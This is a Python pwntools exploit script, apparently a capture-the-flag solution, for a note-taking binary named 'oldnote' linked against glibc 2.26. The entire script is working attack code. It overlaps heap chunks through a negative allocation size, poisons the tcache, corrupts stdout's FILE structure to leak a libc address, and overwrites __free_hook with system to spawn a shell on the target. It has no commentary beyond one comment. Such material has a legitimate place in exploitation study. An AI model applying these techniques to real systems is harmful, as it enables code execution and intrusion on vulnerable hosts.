from pwn import *

exe = ELF("oldnote")
libc = ELF("libc-2.26.so")
ld = ELF("ld-2.26.so")
host = "localhost"
port = 10111
context.binary = exe

while True:

    # p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    p = remote(host, port)


    def new(size, dat):
        p.sendlineafter(": ", "1")
        p.sendlineafter(": ", str(size))
        p.sendafter(": ", dat)


    def remove(idx):
        p.sendlineafter(": ", "2")
        p.sendlineafter(": ", str(idx))


    new(0x10, "A")
    new(0x10, "B")

    for i in range(0x90, 0xd1, 0x10):
        new(i, "i")
        remove(2)

    new(0xe0, b"i" * 0x30 + p64(0x421) + p64(0xe0 - 0x32 + 3))

    remove(0)

    new(-1, "C" * 0x18 + "\x21\x04")

    remove(1)

    # tcache for 0x20 is empty so get a chunk in there to pull later
    new(20, "A")
    remove(1)

    new(-1, b"A" * 16 + p64(0x21) + p64(0x400) + b"\x20\xe7")

    remove(0)

    new(144, "A")

    new(144, p64(0xfbad1800) + p64(0) * 3 + b"\x00")

    try:
        dat = p.recvline()
        libc.address = u64(dat[24:32]) - 0x3d73e0
    except struct.error:
        print("struct.error")
        p.close()
        continue
    except EOFError:
        print("EOFError")
        continue

    log.success("libc_base --> %s" % hex(libc.address))

    remove(0)

    new(0xe0, "iiiiiiii")

    remove(0)

    print("libc_free_hook --> %s" % hex(libc.sym["__free_hook"]))
    log.success("libc_system --> %s" % hex(libc.sym["system"]))

    new(0xf0, b"B" * 0x50 + p64(0) + p64(0xc1) + p64(libc.sym["__free_hook"]))

    remove(0)

    new(0xb0, "/bin/sh")

    remove(1)

    new(0xb0, p64(libc.sym["system"]))

    remove(0)

    p.interactive()
